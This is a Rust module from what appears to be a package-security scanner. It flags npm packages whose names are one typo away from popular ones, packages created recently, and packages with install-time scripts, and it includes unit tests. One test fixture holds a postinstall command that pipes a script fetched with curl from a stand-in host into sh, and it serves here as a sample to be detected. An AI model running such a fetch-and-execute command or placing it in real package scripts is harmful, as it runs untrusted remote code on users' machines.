//! npm packages: install-time scripts, age, and names one typo away from popular ones.

use std::time::{SystemTime, UNIX_EPOCH};

use cirven_core::{Finding, Severity};
use serde_json::Value;

/// Frequent typosquatting targets.
const POPULAR: &[&str] = &[
    "react",
    "react-dom",
    "lodash",
    "express",
    "axios",
    "chalk",
    "commander",
    "debug",
    "moment",
    "request",
    "typescript",
    "webpack",
    "vue",
    "next",
    "eslint",
    "prettier",
    "jquery",
    "dotenv",
    "uuid",
    "yargs",
    "colors",
    "async",
    "bluebird",
    "underscore",
    "classnames",
    "body-parser",
    "cross-env",
    "nodemon",
    "mongoose",
    "socket.io",
    "jsonwebtoken",
    "bcrypt",
    "electron",
    "puppeteer",
    "discord.js",
    "ethers",
    "web3",
    "tailwindcss",
    "vite",
    "zod",
];

const INSTALL_HOOKS: &[&str] = &["preinstall", "install", "postinstall", "prepare"];

pub fn valid_name(name: &str) -> bool {
    let bare = name.strip_prefix('@').unwrap_or(name);
    !bare.is_empty()
        && name.len() <= 214
        && bare.split('/').count() <= 2
        && bare
            .chars()
            .all(|c| c.is_ascii_lowercase() || c.is_ascii_digit() || "-._/".contains(c))
        && !bare.starts_with(['.', '_'])
}

pub fn fetch(name: &str) -> Result<Value, String> {
    let url = format!("https://registry.npmjs.org/{}", name.replace('/', "%2F"));
    let body = crate::aur::get(&url)?;
    serde_json::from_str(&body).map_err(|e| format!("npm registry: {e}"))
}

/// Levenshtein distance, small inputs only.
fn distance(a: &str, b: &str) -> usize {
    let b: Vec<char> = b.chars().collect();
    let mut prev: Vec<usize> = (0..=b.len()).collect();
    for (i, ca) in a.chars().enumerate() {
        let mut cur = vec![i + 1];
        for (j, cb) in b.iter().enumerate() {
            cur.push(
                (prev[j] + usize::from(ca != *cb))
                    .min(prev[j + 1] + 1)
                    .min(cur[j] + 1),
            );
        }
        prev = cur;
    }
    prev[b.len()]
}

pub fn typosquat_of(name: &str) -> Option<&'static str> {
    let bare = name.rsplit('/').next().unwrap_or(name);
    POPULAR
        .iter()
        .find(|p| {
            **p != name
                && bare.len() > 3
                && (distance(bare, p) == 1
                    || bare.replace(['-', '.', '_'], "") == p.replace(['-', '.', '_'], ""))
        })
        .copied()
}

/// Days since an ISO-8601 UTC timestamp like `2024-01-02T03:04:05.000Z`.
pub fn days_since_iso(ts: &str, now: SystemTime) -> Option<u64> {
    let (y, m, d) = (
        ts.get(0..4)?.parse::<i64>().ok()?,
        ts.get(5..7)?.parse::<i64>().ok()?,
        ts.get(8..10)?.parse::<i64>().ok()?,
    );
    // Days from civil date (Howard Hinnant's algorithm).
    let y = if m <= 2 { y - 1 } else { y };
    let era = y.div_euclid(400);
    let yoe = y - era * 400;
    let doy = (153 * (if m > 2 { m - 3 } else { m + 9 }) + 2) / 5 + d - 1;
    let doe = yoe * 365 + yoe / 4 - yoe / 100 + doy;
    let days = era * 146_097 + doe - 719_468;
    let now = now.duration_since(UNIX_EPOCH).ok()?.as_secs() as i64 / 86_400;
    u64::try_from(now - days).ok()
}

pub fn assess(name: &str, doc: &Value, now: SystemTime) -> (String, Vec<Finding>) {
    let mut out = Vec::new();
    let latest = doc["dist-tags"]["latest"]
        .as_str()
        .unwrap_or("?")
        .to_string();
    let version = &doc["versions"][&latest];

    if let Some(target) = typosquat_of(name) {
        out.push(
            Finding::new(
                "pkg.typosquat",
                Severity::High,
                format!("name is one typo away from \"{target}\""),
            )
            .path("typosquats copy a popular name and add a payload; check you meant this package"),
        );
    }
    if let Some(age) = doc["time"]["created"]
        .as_str()
        .and_then(|t| days_since_iso(t, now))
        && age < 30
    {
        out.push(
            Finding::new(
                "pkg.new",
                Severity::Medium,
                format!("package created {age} days ago"),
            )
            .path("no track record yet"),
        );
    }
    for hook in INSTALL_HOOKS {
        let Some(cmd) = version["scripts"][hook].as_str() else {
            continue;
        };
        let mut findings = Vec::new();
        crate::pkgbuild::script(cmd, &format!("package.json scripts.{hook}"), &mut findings);
        let severity = findings
            .iter()
            .map(|f| f.severity)
            .max()
            .unwrap_or(Severity::Medium)
            .max(Severity::Medium);
        out.push(
            Finding::new(
                "pkg.install-script",
                severity,
                format!("runs a {hook} script on npm install"),
            )
            .at(format!("scripts.{hook}"))
            .path(cmd.chars().take(100).collect::<String>()),
        );
        out.extend(findings);
    }
    out.sort_by_key(|f| std::cmp::Reverse(f.severity));
    let label = format!(
        "npm/{name} {latest} · {} maintainers",
        doc["maintainers"].as_array().map_or(0, Vec::len)
    );
    (label, out)
}

#[cfg(test)]
mod tests {
    use super::*;
    use serde_json::json;
    use std::time::Duration;

    #[test]
    fn spots_typosquats_but_not_the_real_thing() {
        assert_eq!(typosquat_of("expresss"), Some("express"));
        assert_eq!(
            typosquat_of("lodahs"),
            None,
            "transpositions are distance 2"
        );
        assert_eq!(typosquat_of("cross-env.js"), None);
        assert_eq!(typosquat_of("crossenv"), Some("cross-env"));
        assert_eq!(typosquat_of("express"), None);
        assert_eq!(typosquat_of("left-pad"), None);
    }

    #[test]
    fn iso_dates() {
        let now = UNIX_EPOCH + Duration::from_secs(20_000 * 86_400);
        assert_eq!(
            days_since_iso("1970-01-01T00:00:00.000Z", now),
            Some(20_000)
        );
        assert_eq!(
            days_since_iso(
                "2024-02-29T12:00:00Z",
                UNIX_EPOCH + Duration::from_secs(19_782 * 86_400)
            ),
            Some(0)
        );
        assert_eq!(days_since_iso("garbage", now), None);
    }

    #[test]
    fn install_scripts_are_reported_and_scanned() {
        let doc = json!({
            "dist-tags": {"latest": "1.0.0"},
            "time": {"created": "2000-01-01T00:00:00.000Z"},
            "maintainers": [{"name": "a"}],
            "versions": {"1.0.0": {"scripts": {"postinstall": "curl -s https://x.example/i.sh | sh", "test": "jest"}}}
        });
        let (label, f) = assess("somepkg", &doc, SystemTime::now());
        assert_eq!(label, "npm/somepkg 1.0.0 · 1 maintainers");
        assert_eq!(f[0].severity, Severity::High);
        assert!(f.iter().any(|f| f.id == "pkg.install-script"));
        assert!(
            f.iter()
                .all(|f| f.location.as_deref() != Some("scripts.test"))
        );
    }

    #[test]
    fn names() {
        assert!(valid_name("@scope/pkg"));
        assert!(valid_name("socket.io"));
        assert!(!valid_name("../x"));
        assert!(!valid_name("a/b/c"));
        assert!(!valid_name("UPPER"));
    }
}
